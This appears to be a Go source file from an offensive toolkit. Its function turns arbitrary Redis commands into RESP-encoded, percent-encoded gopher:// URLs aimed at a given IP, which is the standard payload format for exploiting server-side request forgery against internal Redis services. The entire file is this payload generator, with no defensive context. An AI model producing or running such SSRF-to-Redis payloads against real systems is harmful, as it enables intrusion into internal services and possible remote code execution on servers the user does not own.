package pkg

import (
	"encoding/hex"
	"fmt"
	"strconv"
)

func Gopher(ip string, strs []string) {
	exp := ""

	for _, str := range strs {

		word := ""
		str_flag := false
		var redis_resps []string

		for _, char := range str {

			if str_flag {
				if char == '"' || char == '\'' {
					str_flag = false
					if word != "" {
						redis_resps = append(redis_resps, word)
					}

					word = ""
				} else {
					word += string(char)
				}
			} else if word == "" && (char == '"' || char == '\'') {
				str_flag = true
			} else {
				if char == ' ' {
					if word != "" {
						redis_resps = append(redis_resps, word)
					}

					word = ""
				} else if char == '\n' {
					if word != "" {
						redis_resps = append(redis_resps, word)
					}

					word = ""
				} else {
					word += string(char)
				}

			}

		}

		if word != "" {
			redis_resps = append(redis_resps, word)
		}

		tmp_line := "*" + strconv.Itoa(len(redis_resps)) + "\r\n"

		for _, word := range redis_resps {
			tmp_line += "$" + strconv.Itoa(len(word)) + "\r\n" + word + "\r\n"
		}

		for _, v := range tmp_line {

			exp += hex.EncodeToString([]byte(string(v)))
		}

	}

	fmt.Printf("gopher://%s/_%%%s\n\n", ip, split(exp))
}

func split(s string) string {
	n := len(s)
	if n <= 2 {
		return s
	}
	return split(s[:n-2]) + "%" + s[n-2:]
}
